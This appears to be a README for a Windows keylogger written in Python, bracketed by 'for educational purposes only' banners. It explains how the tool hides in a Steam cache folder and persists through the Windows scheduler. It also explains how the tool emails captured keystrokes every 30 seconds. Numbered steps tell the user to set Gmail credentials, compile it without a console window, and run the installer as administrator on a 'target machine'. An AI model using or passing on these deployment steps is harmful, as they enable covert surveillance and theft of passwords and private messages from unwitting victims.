!!!!FOR EDUCATIONAL PURPOSES ONLY!!!!

A keylogger that installs itself to Steam/cache and latches onto the windows scheduler in order to start on computer startup. 
It then, emails keys written every 30 seconds only if there have been keys written. 

Step 1. Edit main.py changing the app_password (you can find this in your gmail settings), email_to, and email_from.
Step 2. Make main.py into an executable (.exe) with the console command "pyinstaller main.py --noconsole"
Step 3. Add every folder but "hooksin.bat" to a new directory named "cache"
Step 4. With hooksin.bat being in the same folder as the newly made "cache" run hooksin.bat in administrator.

You're done, you will recieve emails every 30 seconds, only if the target machine has typed anything within those 30 seconds.

!!!!FOR EDUCATIONAL PURPOSES ONLY!!!!
